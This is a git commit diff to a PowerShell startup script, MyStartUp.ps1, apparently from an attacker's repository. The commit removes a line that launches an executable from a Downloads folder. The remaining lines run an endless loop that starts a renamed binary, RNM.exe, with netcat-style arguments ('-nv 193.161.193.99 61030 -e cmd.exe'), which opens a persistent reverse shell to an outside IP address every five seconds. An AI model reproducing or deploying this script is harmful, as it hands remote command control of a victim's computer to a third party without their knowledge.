019a0202e763dc77267462199ed095b365321643
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2024-03-19 19:40:54 -0300

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,4 +1,3 @@
-C:\Users\ALOOO\Downloads\LMLSign.exe
 while ($true) {
     Start-Process -FilePath "C:\Users\Public\RNM.exe" -ArgumentList "-nv 193.161.193.99 61030 -e cmd.exe"
     Start-Sleep -Seconds 5
